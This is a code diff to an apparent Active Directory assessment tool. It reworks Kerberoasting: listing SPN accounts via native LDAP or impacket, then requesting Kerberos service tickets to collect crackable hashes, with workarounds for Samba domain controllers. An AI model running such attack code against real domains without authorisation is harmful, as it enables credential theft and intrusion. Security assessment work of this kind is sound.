@@ -329,18 +329,61 @@ def _fold_nxc(host: Host, data: dict, label: str = "supplied credentials",
             remediation="Set an account lockout threshold to slow password spraying."))
 
 
-def run_kerberoast(dc_ip: str, creds: dict) -> tuple[list[dict], str | None]:
+def _spn_targets_native(dc_ip: str, creds: dict) -> list[dict] | None:
+    """SPN accounts via recce's own authenticated LDAP. Returns a list (possibly empty)
+    on a successful bind, or None if the bind/connection was refused (the caller then
+    tries impacket's LDAP - some DCs, e.g. Samba, reject recce's simple/NTLM bind)."""
+    from . import ldap
+    realm = (creds.get("domain") or "").strip()
+    if not realm:
+        return None
+    base = "DC=" + ",DC=".join(realm.split("."))
+    en = ldap.enum_authenticated(dc_ip, 389, base, creds)
+    if en.get("error"):
+        return None
+    out = []
+    for attrs in en.get("users", []):
+        spns = attrs.get("servicePrincipalName") or []
+        name = ldap._first(attrs, "sAMAccountName")
+        if spns and name and not name.endswith("$"):    # skip machine accounts
+            out.append({"user": name, "spn": spns[0]})
+    return out
+
+
+def _spn_targets_impacket(dc_ip: str, creds: dict) -> list[dict] | None:
+    """SPN accounts via impacket-GetUserSPNs (LDAP listing only, no -request, so no
+    roasting - impacket's LDAP binds where recce's native client is refused). None if
+    impacket is unavailable or errored."""
     tool = impacket_tool("GetUserSPNs")
     if not tool or not creds.get("domain"):
-        return [], None
-    # Keep the password off the argv: omit it from the target and answer impacket's
-    # getpass() prompt over stdin (new_session detaches the tty so it reads stdin).
-    target = f"{creds['domain']}/{creds['username']}"
-    out, err = _run([tool, target, "-dc-ip", dc_ip, "-request"],
+        return None
+    out, err = _run([tool, f"{creds['domain']}/{creds['username']}", "-dc-ip", dc_ip],
                     stdin_data=(creds.get("password", "") + "\n"), new_session=True)
     if err:
-        return [], err
-    return parse_getuserspns(out), None
+        return None
+    return [{"user": r["name"], "spn": r["spn"]}
+            for r in parse_getuserspns(out) if r.get("spn")]
+
+
+def run_kerberoast(dc_ip: str, creds: dict) -> tuple[list[dict], str | None]:
+    """Kerberoast every SPN account. Discovery is native LDAP first, impacket's LDAP
+    listing as a fallback; the ROAST itself is always the stdlib Kerberos client, which
+    works against a Samba KDC where impacket-GetUserSPNs -request trips on the
+    authenticator checksum (KRB_AP_ERR_INAPP_CKSUM)."""
+    from . import kerberos
+    realm = (creds.get("domain") or "").strip()
+    targets = _spn_targets_native(dc_ip, creds)
+    if targets is None:                                 # native bind refused
+        targets = _spn_targets_impacket(dc_ip, creds)
+    if targets is None:                                 # no way to discover SPNs
+        return [], None
+    if targets and realm and (creds.get("password") or creds.get("hash")):
+        key = kerberos.client_key(password=creds.get("password", ""),
+                                  nthash=creds.get("hash", ""))
+        results = kerberos.kerberoast(dc_ip, realm, creds.get("username", ""), key, targets)
+        return [{"name": r["user"], "spn": r["spn"], "hash": r.get("hash", "")}
+                for r in results], None
+    return [{"name": t["user"], "spn": t["spn"], "hash": ""} for t in targets], None
 
 
 def run_asrep(dc_ip: str, creds: dict) -> tuple[list[dict], str | None]:
